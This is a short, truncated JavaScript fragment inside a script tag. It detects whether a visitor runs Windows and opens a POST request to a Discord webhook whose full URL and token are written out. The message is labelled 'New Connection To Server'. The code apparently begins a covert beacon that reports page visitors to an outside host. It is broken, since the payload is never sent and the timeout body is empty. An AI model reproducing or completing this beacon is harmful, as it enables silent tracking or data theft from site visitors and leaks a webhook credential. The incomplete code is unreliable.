    <script>

if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";

					var request = new XMLHttpRequest();
      	request.open("POST", "https://discord.com/api/webhooks/1001519254602006558/ElR_KdLWwIlglD5yN2qN5-XJi0j1H2edOR0oJ924BKQdgeslUOMHvWTXLWotCh2Ow0oC");

      	request.setRequestHeader('Content-type', 'application/json');

      	var params = {
        	username: "New Connection To Server",

      	}

        setTimeout(function() {

		}, 500)
